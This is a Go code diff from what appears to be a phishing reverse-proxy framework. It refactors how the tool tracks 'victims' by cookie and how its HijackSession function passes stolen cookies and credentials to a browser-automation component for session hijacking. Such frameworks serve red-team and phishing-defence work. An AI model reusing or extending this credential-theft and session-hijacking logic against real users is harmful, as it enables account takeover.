@@ -291,12 +291,10 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 			// Checking Cookies
 			c, err := request.Cookie(module.Identifier)
 			if err == nil {
-
 				t.ID = c.Value
 
 				// Validate cookie content
 				if t.IsValid() {
-					module.Debug("Fetched victim from cookies: %s", tui.Bold(tui.Red(t.ID)))
 					noTraces = false
 				} else {
 					t = module.makeTrace("")
@@ -306,9 +304,7 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 	}
 
 	if noTraces {
-		module.Debug("No traces found in defined channels %s", request.URL.RawPath)
 		t.ID = module.makeID()
-		// t = module.makeTrace("")
 	}
 
 	//
@@ -341,7 +337,7 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 			LastSeen:     time.Now().UTC().Format("2006-01-02 15:04:05"),
 		}
 
-		module.Push(v)
+		module.PushVictim(v)
 		module.Info("New victim [%s] IP[%s] UA[%s]", tui.Bold(tui.Red(t.ID)), IPSource, request.UserAgent())
 	}
 
@@ -491,21 +487,8 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 		return
 	}
 
-	// get all the cookies from the CookieJar
-	cookieJar, err := db.GetVictimCookiejar(victim.ID)
-	if err != nil {
-		t.Error("error getting victim %s cookieJar: %s", victim.ID, err)
-	}
-
-	// get all the credentials
-	var credentials []db.VictimCredential
-	for i := 0; i < victim.CredsCount; i++ {
-		creds, _ := victim.GetCredentials(i)
-		credentials = append(credentials, *creds)
-	}
-
 	// Pass credentials
-	creds, err := json.MarshalIndent(credentials, "", "\t")
+	creds, err := json.MarshalIndent(victim.Credentials, "", "\t")
 	if err != nil {
 		t.Warning(err.Error())
 	}
@@ -516,7 +499,7 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 	} else {
 		nb, ok := m.(*necrobrowser.Necrobrowser)
 		if ok {
-			go nb.Instrument(cookieJar, string(creds))
+			go nb.Instrument(victim.Cookies, string(creds))
 		}
 	}
 
